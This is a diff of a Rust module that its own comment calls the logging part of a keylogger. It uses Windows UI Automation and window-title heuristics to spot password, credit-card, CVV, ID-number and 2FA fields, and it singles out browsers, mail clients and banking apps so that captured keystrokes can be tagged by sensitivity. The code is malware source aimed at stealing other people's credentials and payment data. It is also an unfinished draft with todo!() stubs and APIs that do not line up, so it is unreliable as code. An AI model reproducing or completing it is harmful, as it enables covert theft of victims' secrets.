@@ -1,113 +1,297 @@
-/*
-    WORK IN PROGRESS
-
-
-Este archivo de log.rs es para manejar la funcionalidad de registro del keylogger.rs, incluyendo la captura de eventos de teclado, la identificación de la ventana activa y el almacenamiento seguro
-
-WIP: Todavía no lo testee, solo lo pusheo para guardarlo
-Utiliza AccessKit para detectar campos sensibles en la ventana activa y clasificar los logs según su sensibilidad.
-
-*/
+// ==== WORK IN PROGRESS ====
 
 use chrono::Utc;
-use accesskit::{NodeBuilder, NodeId, Role, Tree, TreeUpdate}; 
-use accesskit_windows::Adapter;
 use std::collections::HashMap;
+use crate::utils::{get_active_process_info, is_sensitive_process, ActiveProcessInfo};
 
+// Usar la crate windows para UI Automation
+use winapi::um::oaidl::VARIANT;
+use winapi::um::combaseapi::*;
+use winapi::um::oleauto::*;
+use winapi::shared::wtypes::*;
+use winapi::um::winerror::{S_OK, FAILED};
+use std::ptr;
 
-// Estructura de datos para campos sensibles detectados
 pub struct SensitiveFieldDetector {
-    sensitive_fields: HashMap<String, FieldType>, // utilizamos una tabla hash para evitar duplicados
+    sensitive_fields: HashMap<String, FieldType>,
 }
 
-
-// Tipos de campos sensibles
 #[derive(Debug, Clone)]
 pub enum FieldType {
     Password,
-    Email, // email = username en muchos casos
+    Email,
     CreditCard,
     CVV,
     DNI,
     Phone,
     Address,
     Login,
+    Registration,
+    TwoFactor,
 }
 
-// Implementación del detector de campos sensibles
 impl SensitiveFieldDetector {
     pub fn new() -> Self {
         Self {
-            sensitive_fields: HashMap::new(), // hashmap constructor
+            sensitive_fields: HashMap::new(),
         }
     }
     
-
-    // Escanear la ventana activa y detectar campos sensibles
+    // Escanear la ventana activa en busca de campos sensibles
     pub fn scan_active_window(&mut self) -> Result<Vec<SensitiveField>, Box<dyn std::error::Error>> {
         let mut sensitive_fields = Vec::new();
         
-        // Obtener el árbol de accesibilidad de la ventana activa
-        if let Some(tree) = self.get_accessibility_tree()? {
-            self.traverse_tree(&tree, &mut sensitive_fields)?;
+        let process_info = get_active_process_info()?;
+        
+        // Solo escanear si es un proceso sensible
+        if !is_sensitive_process(&process_info) {
+            return Ok(sensitive_fields);
+        }
+        
+        // Intentar usar UI Automation primero
+        match self.scan_with_ui_automation(&process_info) {
+            Ok(fields) => {
+                sensitive_fields.extend(fields);
+            },
+            Err(e) => {
+                println!("UI Automation failed: {}, using fallback", e);
+                self.fallback_window_detection(&process_info, &mut sensitive_fields);
+            }
         }
         
         Ok(sensitive_fields)
     }
-    
-    fn get_accessibility_tree(&self) -> Result<Option<Tree>, Box<dyn std::error::Error>> {
-        // Implementar obtención del árbol de accesibilidad
-        // Esto requiere integración específica con AccessKit
-        todo!("Implementar obtención del árbol de accesibilidad")
-    }
-    
-    fn traverse_tree(&self, tree: &Tree, sensitive_fields: &mut Vec<SensitiveField>) -> Result<(), Box<dyn std::error::Error>> {
-        // Recorrer todos los nodos del árbol
-        for (node_id, node) in tree.nodes() {
-            if let Some(field_type) = self.classify_node(node) {
-                sensitive_fields.push(SensitiveField {
-                    id: format!("{:?}", node_id),
-                    field_type,
-                    label: node.name().unwrap_or("").to_string(),
-                    value: node.value().unwrap_or("").to_string(),
-                    is_focused: node.is_focused(),
-                });
-            }
+
+    // Implementación de UI Automation para Windows
+    fn scan_with_ui_automation(&self, process_info: &ActiveProcessInfo) -> Result<Vec<SensitiveField>, Box<dyn std::error::Error>> {
+        unsafe {
+            // Inicializar COM
+            CoInitialize(None)?;
+            
+            let mut sensitive_fields = Vec::new();
+            
+            // Crear instancia de UI Automation
+            let automation: IUIAutomation = CoCreateInstance(&CUIAutomation, None, CLSCTX_INPROC_SERVER)?;
+            
+            // Obtener el elemento de la ventana activa
+            let desktop = automation.GetRootElement()?;
+            let focused_element = automation.GetFocusedElement()?;
+            
+            // Buscar elementos sensibles en la ventana
+            self.find_sensitive_elements(&automation, &desktop, &mut sensitive_fields)?;
+            
+            // Cleanup COM
+            CoUninitialize();
+            
+            Ok(sensitive_fields)
         }
-        Ok(())
     }
     
-    fn classify_node(&self, node: &accesskit::Node) -> Option<FieldType> {
-        match node.role() {
-            Role::PasswordBox => Some(FieldType::Password),
-            Role::TextBox => {
-                // Analizar el nombre/label del campo
-                if let Some(name) = node.name() {
-                    let name_lower = name.to_lowercase();
-                    if name_lower.contains("password") || name_lower.contains("pwd") {
-                        Some(FieldType::Password)
-                    } else if name_lower.contains("email") || name_lower.contains("e-mail") {
-                        Some(FieldType::Email)
-                    } else if name_lower.contains("credit") || name_lower.contains("card") {
-                        Some(FieldType::CreditCard)
-                    } else if name_lower.contains("cvv") || name_lower.contains("cvc") {
-                        Some(FieldType::CVV)
-                    } else if name_lower.contains("DNI") || name_lower.contains("dni") {
-                        Some(FieldType::DNI)
-                    } else if name_lower.contains("phone") || name_lower.contains("tel") {
-                        Some(FieldType::Phone)
-                    } else if name_lower.contains("address") || name_lower.contains("street") {
-                        Some(FieldType::Address)
-                    } else if name_lower.contains("login") || name_lower.contains("username") {
-                        Some(FieldType::Login)
+    fn find_sensitive_elements(&self, automation: &IUIAutomation, element: &IUIAutomationElement, sensitive_fields: &mut Vec<SensitiveField>) -> Result<(), Box<dyn std::error::Error>> {
+        unsafe {
+            // Buscar campos de entrada (Edit controls)
+            let property_id = UIA_ControlTypePropertyId;
+            let variant = VARIANT::from(UIA_EditControlTypeId);
+            let condition = automation.CreatePropertyCondition(property_id, &variant)?;
+            let edit_elements = element.FindAll(TreeScope_Descendants, &condition)?;
+            
+            let count = edit_elements.Length()?;
+            for i in 0..count {
+                let edit_element = edit_elements.GetElement(i)?;
+                
+                if let Ok(field) = self.analyze_element(&edit_element) {
+                    // Detectar campos de contraseña por nombre/atributos en lugar de GetCurrentPropertyValue
+                    if self.is_password_field(&edit_element) {
+                        let password_field = SensitiveField {
+                            id: format!("password_{}", i),
+                            field_type: FieldType::Password,
+                            label: self.get_element_name(&edit_element).unwrap_or_else(|| "Password Field".to_string()),
+                            value: "".to_string(),
+                            is_focused: self.is_element_focused(&edit_element).unwrap_or(false),
+                        };
+                        sensitive_fields.push(password_field);
                     } else {
-                        None
+                        sensitive_fields.push(field);
                     }
-                } else {
-                    None
                 }
-            },
-            _ => None,
+            }
+            
+            Ok(())
+        }
+    }
+    
+
+
+
+    fn is_password_field(&self, element: &IUIAutomationElement) -> bool {
+        // Detectar campos de contraseña por nombre, clase o automation ID
+        let name = self.get_element_name(element).unwrap_or_default().to_lowercase();
+        let automation_id = self.get_element_automation_id(element).unwrap_or_default().to_lowercase();
+        let class_name = self.get_element_class_name(element).unwrap_or_default().to_lowercase();
+        
+        let combined = format!("{} {} {}", name, automation_id, class_name);
+        
+        combined.contains("password") || 
+        combined.contains("pwd") || 
+        combined.contains("pass") ||
+        combined.contains("secret") ||
+        combined.contains("pin") ||
+        name.starts_with("*") // Algunos campos de contraseña muestran asteriscos
+    }
+    
+    fn analyze_element(&self, element: &IUIAutomationElement) -> Result<SensitiveField, Box<dyn std::error::Error>> {
+        let name = self.get_element_name(element).unwrap_or_default();
+        let automation_id = self.get_element_automation_id(element).unwrap_or_default();
+        let class_name = self.get_element_class_name(element).unwrap_or_default();
+        
+        let field_type = self.determine_field_type(&name, &automation_id, &class_name);
+        let is_focused = self.is_element_focused(element).unwrap_or(false);
+        
+        Ok(SensitiveField {
+            id: automation_id.clone(),
+            field_type,
+            label: name,
+            value: "".to_string(),
+            is_focused,
+        })
+    }
+    
+    fn get_element_name(&self, element: &IUIAutomationElement) -> Option<String> {
+        unsafe {
+            element.CurrentName().ok()
+                .map(|bstr| bstr.to_string())
+        }
+    }
+    
+    fn get_element_automation_id(&self, element: &IUIAutomationElement) -> Option<String> {
+        unsafe {
+            element.CurrentAutomationId().ok()
+                .map(|bstr| bstr.to_string())
+        }
+    }
+    
+    fn get_element_class_name(&self, element: &IUIAutomationElement) -> Option<String> {
+        unsafe {
+            element.CurrentClassName().ok()
+                .map(|bstr| bstr.to_string())
+        }
+    }
+    
+
+
+fn is_element_focused(&self, element: &IUIAutomationElement) -> Result<bool, Box<dyn std::error::Error>> {
+ // TODO
+ todo!("Implementar is_element_focused");
+ }
+
+
+
+ 
+    fn determine_field_type(&self, name: &str, automation_id: &str, class_name: &str) -> FieldType {
+        let combined = format!("{} {} {}", name.to_lowercase(), automation_id.to_lowercase(), class_name.to_lowercase());
+        
+        if combined.contains("password") || combined.contains("pwd") || combined.contains("pass") {
+            FieldType::Password
+        } else if combined.contains("email") || combined.contains("mail") || combined.contains("@") {
+            FieldType::Email
+        } else if combined.contains("credit") || combined.contains("card") || combined.contains("cc") {
+            FieldType::CreditCard
+        } else if combined.contains("cvv") || combined.contains("cvc") || combined.contains("security") {
+            FieldType::CVV
+        } else if combined.contains("dni") || combined.contains("document") || combined.contains("id") {
+            FieldType::DNI
+        } else if combined.contains("phone") || combined.contains("tel") || combined.contains("mobile") {
+            FieldType::Phone
+        } else if combined.contains("address") || combined.contains("street") || combined.contains("city") {
+            FieldType::Address
+        } else if combined.contains("login") || combined.contains("user") || combined.contains("signin") {
+            FieldType::Login
+        } else if combined.contains("register") || combined.contains("signup") || combined.contains("create") {
+            FieldType::Registration
+        } else if combined.contains("2fa") || combined.contains("code") || combined.contains("token") {
+            FieldType::TwoFactor
+        } else {
+            FieldType::Login // Default fallback
+        }
+    }
+    
+    // Detección mejorada basada en ventana y proceso
+    fn fallback_window_detection(&self, process_info: &ActiveProcessInfo, sensitive_fields: &mut Vec<SensitiveField>) {
+        let title_lower = process_info.window_title.to_lowercase();
+        let process_lower = process_info.process_name.to_lowercase();
+        
+        // Detección por proceso específico
+        if self.is_browser(&process_lower) {
+            self.detect_browser_context(&title_lower, sensitive_fields);
+        } else if self.is_email_client(&process_lower) {
+            self.detect_email_context(&title_lower, sensitive_fields);
+        } else if self.is_financial_app(&process_lower) {
+            self.detect_financial_context(&title_lower, sensitive_fields);
+        } else {
+            // Detección genérica por título
+            self.detect_generic_context(&title_lower, sensitive_fields);
+        }
+    }
+    
+    fn is_browser(&self, process_name: &str) -> bool {
+        process_name.contains("chrome") || process_name.contains("firefox") || 
+        process_name.contains("edge") || process_name.contains("opera") || 
+        process_name.contains("brave")
+    }
+    
+    fn is_email_client(&self, process_name: &str) -> bool {
+        process_name.contains("outlook") || process_name.contains("thunderbird") || 
+        process_name.contains("mail")
+    }
+    
+    fn is_financial_app(&self, process_name: &str) -> bool {
+        process_name.contains("bank") || process_name.contains("paypal") || 
+        process_name.contains("wallet")
+    }
+    
+    fn detect_browser_context(&self, title: &str, sensitive_fields: &mut Vec<SensitiveField>) {
+        if title.contains("login") || title.contains("sign in") || title.contains("log in") {
+            sensitive_fields.push(self.create_field(FieldType::Login, "Browser Login Form", title));
+        } else if title.contains("register") || title.contains("sign up") || title.contains("create account") {
+            sensitive_fields.push(self.create_field(FieldType::Registration, "Browser Registration Form", title));
+        } else if title.contains("checkout") || title.contains("payment") || title.contains("billing") {
+            sensitive_fields.push(self.create_field(FieldType::CreditCard, "Payment Form", title));
+        } else if title.contains("gmail") || title.contains("outlook") || title.contains("yahoo") {
+            sensitive_fields.push(self.create_field(FieldType::Email, "Email Service", title));
+        } else if title.contains("facebook") || title.contains("twitter") || title.contains("instagram") {
+            sensitive_fields.push(self.create_field(FieldType::Login, "Social Media", title));
+        }
+    }
+    
+    fn detect_email_context(&self, title: &str, sensitive_fields: &mut Vec<SensitiveField>) {
+        if title.contains("compose") || title.contains("new message") {
+            sensitive_fields.push(self.create_field(FieldType::Email, "Email Composition", title));
+        } else if title.contains("login") || title.contains("password") {
+            sensitive_fields.push(self.create_field(FieldType::Password, "Email Login", title));
+        }
+    }
+    
+    fn detect_financial_context(&self, title: &str, sensitive_fields: &mut Vec<SensitiveField>) {
+        sensitive_fields.push(self.create_field(FieldType::CreditCard, "Financial Application", title));
+    }
+    
+    fn detect_generic_context(&self, title: &str, sensitive_fields: &mut Vec<SensitiveField>) {
+        if title.contains("password") {
+            sensitive_fields.push(self.create_field(FieldType::Password, "Password Field", title));
+        } else if title.contains("login") || title.contains("sign in") {
+            sensitive_fields.push(self.create_field(FieldType::Login, "Login Form", title));
+        } else if title.contains("register") || title.contains("sign up") {
+            sensitive_fields.push(self.create_field(FieldType::Registration, "Registration Form", title));
+        }
+    }
+    
+    fn create_field(&self, field_type: FieldType, context: &str, title: &str) -> SensitiveField {
+        SensitiveField {
+            id: "window_detection".to_string(),
+            field_type,
+            label: format!("{}: {}", context, title),
+            value: "".to_string(),
+            is_focused: true,
         }
     }
 }
@@ -150,34 +334,29 @@ impl LogEntry {
     }
     
     pub fn with_sensitive_context(mut self, fields: Vec<SensitiveField>) -> Self {
-        self.sensitive_context = Some(fields);
         if !fields.is_empty() {
             self.event_type = EventType::SensitiveFieldDetected;
         }
+        self.sensitive_context = Some(fields);
         self
     }
 }
 
 pub fn write_log(entry: LogEntry) {
-    // Clasificar por sensibilidad
     let sensitivity_level = classify_sensitivity(&entry);
     
     match sensitivity_level {
         SensitivityLevel::High => {
-            // Logs altamente sensibles - máxima encriptación
             write_encrypted_log(&entry, EncryptionLevel::Maximum);
         },
         SensitivityLevel::Medium => {
-            // Logs medianamente sensibles
             write_encrypted_log(&entry, EncryptionLevel::Standard);
         },
         SensitivityLevel::Low => {
-            // Logs normales
             write_standard_log(&entry);
         },
     }
     
-    // Debug output
     println!("[{}] [{}] {}: {}", 
         entry.timestamp.format("%Y-%m-%d %H:%M:%S"),
         format!("{:?}", entry.event_type),
@@ -187,22 +366,22 @@ pub fn write_log(entry: LogEntry) {
     
     if let Some(ref sensitive_fields) = entry.sensitive_context {
         for field in sensitive_fields {
-            println!("  ⚠️  SENSITIVE: {:?} field '{}' detected", field.field_type, field.label);
+            println!("  ⚠️  SENSITIVE: {:?} - {}", field.field_type, field.label);
         }
     }
 }
 
 #[derive(Debug)]
 enum SensitivityLevel {
-    High,    // Passwords, credit cards, DNI
-    Medium,  // Email, phone, address
-    Low,     // Normal text
+    High,
+    Medium,
+    Low,
 }
 
 #[derive(Debug)]
 enum EncryptionLevel {
-    Maximum,  // AES-256-GCM + key derivation
-    Standard, // AES-128-GCM
+    Maximum,
+    Standard,
 }
 
 fn classify_sensitivity(entry: &LogEntry) -> SensitivityLevel {
@@ -223,11 +402,9 @@ fn classify_sensitivity(entry: &LogEntry) -> SensitivityLevel {
 }
 
 fn write_encrypted_log(entry: &LogEntry, level: EncryptionLevel) {
-    // TODO: Implementar encriptación según el nivel
     println!("📝 ENCRYPTED LOG ({:?}): Sensitive data detected", level);
 }
 
 fn write_standard_log(entry: &LogEntry) {
-    // TODO: Implementar log estándar
     println!("📝 STANDARD LOG: Regular keylog entry");
 }
